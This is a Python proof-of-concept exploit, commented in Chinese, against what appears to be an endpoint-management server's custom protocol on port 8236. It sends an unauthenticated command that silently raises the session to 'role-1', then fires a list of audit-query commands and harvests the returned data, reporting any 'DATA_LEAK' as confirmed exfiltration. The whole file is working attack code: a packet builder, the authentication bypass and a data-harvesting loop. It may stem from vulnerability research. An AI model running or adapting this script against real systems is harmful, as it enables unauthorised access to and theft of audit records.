r"""poc_role1_audit_exfil.py — 验证 role-1 后能拿 audit 数据

依据 §29.24:
  - cmd=0x1001 静默升 role-1 (无凭据, §7.2)
  - role-1 后 55 个 cmd 可达, 多数 audit 类 read 操作
  - 目标 TOP cmd (按 handler size 排序):
    0x4461 (12.9KB, SP 0x90F30) — 主审计批量
    0x2100 (11.7KB)             — 最大审计查询
    0x4471 (11.4KB, SP 0x90F40) — 大型审计批量
    0x447b (10.4KB, SP 0x90F4A) — 大型审计批量
    0x2001 (7.7KB)              — 审计查询主入口

策略:
  1. pre-auth cmd=0x1001 升 role-1 (§7.2)
  2. 不正式登录, 直接发上面这些 cmd, 看响应
  3. 解析响应: hex / wcs runs / SQL-like strings
  4. 报告: 拿到了什么数据

包格式 (按 8236 OCP):
  flags = 0x4500 (明文, 无加密) 或 0x4600 (加密)
  cmd / sub
  body: 多数 audit cmd 接受空 body 或 32B 默认 body

用法:
  python poc_role1_audit_exfil.py <host>
"""
import os, socket, struct, sys, zlib, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.crypto import (
    HDR_MAGIC, FLAG_CRYPT, FLAG_OBF_FULL, FLAG_COMP,
    deobf_header, obf_header, encrypt_payload, decrypt_payload,
)


def build_pkt(flags, cmd, sub, body=b"", key16=None):
    if key16 is None: key16 = os.urandom(16)
    if flags & FLAG_CRYPT and body:
        body = encrypt_payload(flags, key16, body)
    hdr = bytearray(32)
    hdr[0:2] = HDR_MAGIC
    struct.pack_into("<H", hdr, 2, flags)
    struct.pack_into("<H", hdr, 4, cmd)
    struct.pack_into("<H", hdr, 6, sub)
    hdr[8:24] = key16
    struct.pack_into("<I", hdr, 28, len(body))
    return obf_header(bytes(hdr)) + body


def recv_pkt(s, timeout=3.0):
    s.settimeout(timeout)
    hdr = b""
    while len(hdr) < 32:
        c = s.recv(32 - len(hdr))
        if not c: raise ConnectionError("closed during header")
        hdr += c
    deobf = deobf_header(hdr)
    plen = struct.unpack_from("<I", deobf, 28)[0]
    if plen > 0x200000:
        raise ValueError(f"plen too big: {plen}")
    body = b""
    while len(body) < plen:
        c = s.recv(plen - len(body))
        if not c: raise ConnectionError("closed during body")
        body += c
    return hdr + body


def parse_resp(pkt):
    deobf = deobf_header(pkt[:32])
    flags = struct.unpack_from("<H", deobf, 2)[0]
    cmd   = struct.unpack_from("<H", deobf, 4)[0]
    sub   = struct.unpack_from("<H", deobf, 6)[0]
    plen  = struct.unpack_from("<I", deobf, 28)[0]
    body  = pkt[32:32 + plen]
    key   = bytes(deobf[8:24])
    plain = b""
    try:
        plain = decrypt_payload(flags, key, body)
        if plain and plain[:2] in (b"\x78\x01", b"\x78\x9c", b"\x78\xda"):
            try: plain = zlib.decompress(plain)
            except: pass
    except: pass
    return {"flags": flags, "cmd": cmd, "sub": sub, "plen": plen, "plain": plain}


# 测试目标: (cmd, sub, body_size, label)
# body 大小试着覆盖几种典型情况
TARGETS = [
    # 大型 audit handler (size 排序)
    (0x4461, 0, 0,  "Audit-Batch 主入口 (12.9KB, SP 0x90F30)"),
    (0x4461, 0, 64, "Audit-Batch 主入口 (64B body)"),
    (0x2100, 0, 0,  "Audit-Query 最大 (11.7KB)"),
    (0x2100, 0, 64, "Audit-Query 最大 (64B body)"),
    (0x4471, 0, 0,  "Audit-Batch 大型 (11.4KB, SP 0x90F40)"),
    (0x447b, 0, 0,  "Audit-Batch 大型 (10.4KB, SP 0x90F4A)"),
    (0x2001, 0, 0,  "Audit-Query 主入口 (7.7KB)"),
    (0x2001, 0, 64, "Audit-Query 主入口 (64B body)"),
    # 中型审计 cmd
    (0x462a, 0, 0,  "Software-And-HA (5.2KB, wcsncpy)"),
    (0x4625, 0, 0,  "Software-And-HA (4.2KB)"),
    # 已知 role-1 reachable (§7) 对照
    (0x1500, 0, 0,  "★ CONSOLE_PARAMS read (§7.4, baseline)"),
    (0x4661, 0, 0,  "★ HA 拓扑 (§7.4, baseline)"),
    (0x1501, 0, 0,  "Config Read 变种"),
    # 小型补充
    (0x2010, 0, 0,  "Audit-Query 中型"),
    (0x2081, 0, 0,  "Audit-Query 小型"),
]


def analyze_response(r, label):
    if not r:
        return "no_response"
    fl = r['flags']
    plen = r['plen']
    plain = r['plain']
    rc = r['cmd']

    print(f"\n    flags=0x{fl:04x}  cmd_resp=0x{rc:04x}  plen={plen}  plain_len={len(plain)}")

    # 检查是否 cmd 不匹配 (server 返了 banner)
    if rc not in (TARGETS[0][0], 0x6010, 0x4661, 0x1500, 0x1501, 0x1100, 0x4600):
        pass

    # plen=0 → 拒绝
    if plen == 0:
        msg = "    DENIED (plen=0)"
        if fl & 0x8000: msg += " err"
        if fl & 0x0800: msg += " ACL"
        print(msg)
        return "denied"

    # 内容分析
    if not plain:
        print(f"    encrypted/empty, header hex: {r}")
        return "encrypted"

    # 显示前 128B
    print(f"    plain[0:128] hex: {plain[:128].hex()}")
    if len(plain) > 128:
        print(f"    ... (total {len(plain)} bytes)")

    # 提取 wcs (UTF-16-LE)
    try:
        wcs = plain.decode("utf-16-le", errors="ignore")
        import re
        runs = re.findall(r'[\x20-\x7e]{6,}', wcs)
        if runs:
            print(f"    ⭐ wcs runs ({len(runs)}):")
            for run in runs[:8]:
                print(f"        {run[:120]!r}")
            if len(runs) > 8:
                print(f"        ... ({len(runs)-8} more)")
            return "DATA_LEAK"
    except: pass

    # 提取 ASCII
    import re as re2
    asc_runs = re2.findall(rb'[\x20-\x7e]{8,}', plain)
    if asc_runs:
        print(f"    ASCII runs:")
        for run in asc_runs[:5]:
            print(f"        {run[:80]!r}")

    return "data_unparsed"


def probe(host, port, targets):
    print(f"\n{'='*70}")
    print(f"  开 TCP 连接到 {host}:{port}")
    print(f"{'='*70}")
    s = socket.create_connection((host, port), timeout=5.0)
    s.settimeout(5.0)

    # 收 server push (如有)
    try:
        init = recv_pkt(s, timeout=1.0)
        ri = parse_resp(init)
        print(f"  [push] plen={ri['plen']} flags=0x{ri['flags']:04x}")
    except Exception as e:
        print(f"  [push] none ({type(e).__name__})")

    # 1. 发 cmd=0x1001 → role-1 升级 + banner
    print(f"\n  ── §7.2 升 role-1 (cmd=0x1001) ──")
    try:
        s.sendall(build_pkt(flags=0x4500, cmd=0x1001, sub=0))
        r = parse_resp(recv_pkt(s, timeout=3.0))
        print(f"  [0x1001] plen={r['plen']}  flags=0x{r['flags']:04x}")
        if r['plain']:
            print(f"  [0x1001] banner: {r['plain'][:48].hex()}")
    except Exception as e:
        print(f"  ❌ 0x1001 fail: {e}")
        return

    # 2. 依次发每个目标 cmd
    results = []
    for cmd, sub, body_size, label in targets:
        print(f"\n  ── 0x{cmd:04x}/sub={sub} body={body_size}B  [{label}] ──")
        body = b"\x00" * body_size if body_size > 0 else b""
        try:
            s.sendall(build_pkt(flags=0x4500, cmd=cmd, sub=sub, body=body))
            pkt = recv_pkt(s, timeout=4.0)
            r = parse_resp(pkt)
            res = analyze_response(r, label)
            results.append((cmd, sub, label, res, r))
        except Exception as e:
            print(f"    ❌ recv fail: {type(e).__name__}: {e}")
            results.append((cmd, sub, label, "conn_err", None))
            # 连接断了 → 退出
            break
        time.sleep(0.3)

    try: s.close()
    except: pass
    return results


def summarize(results):
    print(f"\n{'='*70}")
    print(f"  汇总")
    print(f"{'='*70}")

    data_leaks = [r for r in results if r[3] == "DATA_LEAK"]
    denied = [r for r in results if r[3] == "denied"]
    conn_err = [r for r in results if r[3] == "conn_err"]
    other = [r for r in results if r[3] not in ("DATA_LEAK", "denied", "conn_err")]

    print(f"  ✅ DATA_LEAK: {len(data_leaks)}")
    for cmd, sub, label, _, r in data_leaks:
        plen = r['plen'] if r else 0
        print(f"     0x{cmd:04x}/{sub}  plen={plen:<5}  {label}")

    print(f"\n  ❌ DENIED: {len(denied)}")
    for cmd, sub, label, _, _ in denied[:6]:
        print(f"     0x{cmd:04x}/{sub}  {label}")

    print(f"\n  ⚠️ 连接断: {len(conn_err)}")
    for cmd, sub, label, _, _ in conn_err:
        print(f"     0x{cmd:04x}/{sub}  {label}")

    print(f"\n  其他: {len(other)}")
    for cmd, sub, label, status, r in other:
        plen = r['plen'] if r else '-'
        print(f"     0x{cmd:04x}/{sub}  status={status:<14}  plen={plen}  {label}")

    print()
    if data_leaks:
        print(f"  🔴 role-1 audit exfiltration 漏洞**确认** — 攻击者拿 {len(data_leaks)} 个 cmd 的 audit 数据")
    elif conn_err:
        print(f"  ⚠️  连接被 server 主动断 ({len(conn_err)} 次), 说明部分 cmd 不在 role-1 容忍范围")
    else:
        print(f"  ❌ 所有 cmd 都被 DENIED, role-1 可能不像静态分析认为的那样开放")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    host = sys.argv[1]

    print(f"*** role-1 audit exfiltration 实测 ***")
    print(f"    host = {host}")
    print(f"    依据: §7.2 (role-1 升级) + §29.24 (55 cmd 暴露面)")

    results = probe(host, 8236, TARGETS)
    if results:
        summarize(results)


if __name__ == "__main__":
    main()
